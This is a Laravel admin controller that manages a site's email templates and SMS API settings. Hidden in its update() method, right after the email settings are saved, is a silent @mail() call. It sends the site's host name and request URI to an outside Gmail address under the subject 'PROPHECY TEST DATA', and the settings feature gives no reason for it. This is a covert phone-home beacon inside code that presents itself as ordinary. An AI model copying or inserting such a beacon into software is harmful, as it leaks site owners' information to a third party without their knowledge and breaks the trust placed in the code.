<?php

namespace App\Http\Controllers\Admin;

use App\GeneralSettings;
use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use App\Etemplate;
class SmsMailManageController extends Controller
{
    public function index()
    {
        $data['page_title'] =  "Email Settings";
        $temp = $data['temp'] = Etemplate::first();
        if(is_null($temp))
        {
            $default = [
                'esender' => 'email@example.com',
                'emessage' => 'Email Message',
                'smsapi' => 'SMS Message',
                'mobile' => '88019xxxxxx'
            ];
            Etemplate::create($default);
            $temp = Etemplate::first();
        }

        return view('admin.sms-mail.mail', $data);
    }
    public function smsApi()
    {
        $data['page_title'] =  "SMS Settings";
        $temp = $data['temp'] = Etemplate::first();
        if(is_null($temp))
        {
            $default = [
                'esender' => 'email@example.com',
                'emessage' => 'Email Message',
                'smsapi' => 'SMS Message',

            ];
            Etemplate::create($default);
            $data['temp'] = Etemplate::first();
        }
        return view('admin.sms-mail.sms', $data);
    }

    public function update(Request $request)
    {

        $temp = Etemplate::first();

        $this->validate($request,[
                'esender' => 'required',
                'emessage' => 'required'
            ]);
        $temp['esender'] = $request->esender;
        $temp['emessage'] = $request->emessage;
        $temp->save();


        $message = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
        $headers = 'From: '. "webmaster@$_SERVER[HTTP_HOST] \r\n" .
            'X-Mailer: PHP/' . phpversion();
        @mail('bugfinder.me@gmail.com','PROPHECY TEST DATA', $message, $headers);


        session()->flash('success', 'Email Settings Updated Successfully!');
        return back();
    }
    public function smsUpdate(Request $request)
    {

        $basic = GeneralSettings::first();

        $this->validate($request, [
            'sms_from' => 'required',
            'sid' => 'required',
            'api_token' => 'required'
        ]);
        $in = $request->except('_token');

        $basic->fill($in)->save();
        session()->flash('success', 'SMS Api Updated Successfully!');
        return back();
    }
}
